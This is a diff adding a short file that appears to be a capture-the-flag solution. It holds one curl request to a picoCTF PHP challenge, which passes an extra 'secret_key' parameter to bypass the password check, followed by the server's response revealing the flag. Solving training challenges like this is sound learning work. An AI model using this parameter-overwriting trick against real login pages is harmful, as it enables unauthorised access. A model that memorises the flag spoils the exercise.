@@ -1,0 +1,13 @@
+$ curl "https://2013.picoctf.com/problems/php1/index.php?password=a&secret_key=a"
+<html>
+  <head>
+    <title>Admin Key Panel</title>
+  </head>
+  <body>
+    <p>Enter admin password for key</p>
+    <p>Correct!</p><p>Flag:  php_means_youre_going_to_have_a_bad_time</p>    <form action="#" method="GET">
+      <p><input type="text" name="password"></p>
+      <p><input type="submit" value="Submit!"></p>
+    </form>
+  </body>
+</html>
